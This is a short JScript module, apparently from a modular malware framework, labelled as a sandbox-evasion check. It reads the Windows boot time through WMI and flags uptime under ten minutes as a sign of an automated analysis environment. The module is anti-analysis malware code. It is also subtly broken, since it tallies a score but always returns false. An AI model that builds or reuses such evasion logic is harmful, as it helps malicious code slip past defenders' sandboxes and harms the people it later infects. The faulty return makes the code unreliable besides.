// chunk: evasion/uptime_check
// depends: core/run_cmd
// provides: check_uptime
// format: jscript
// note: WMI Win32_OperatingSystem.LastBootUpTime check. Fresh boot under
//       10 minutes indicates sandbox auto-analysis environment.

function check_uptime() {
    var score = 0;
    try {
        var loc = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc = loc.ConnectServer(".", "root\\cimv2");
        var os = svc.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem");
        var en = new Enumerator(os);
        if (!en.atEnd()) {
            var bootStr = en.item().LastBootUpTime;
            /* WMI datetime format: 20250101120000.000000+060 */
            var year = parseInt(bootStr.substr(0, 4));
            var month = parseInt(bootStr.substr(4, 2)) - 1;
            var day = parseInt(bootStr.substr(6, 2));
            var hour = parseInt(bootStr.substr(8, 2));
            var min = parseInt(bootStr.substr(10, 2));
            var sec = parseInt(bootStr.substr(12, 2));
            var bootDate = new Date(year, month, day, hour, min, sec);
            var uptimeMin = (new Date() - bootDate) / 60000;
            if (uptimeMin < 10) score++;
        }
    } catch(e) {}
    return false;
}
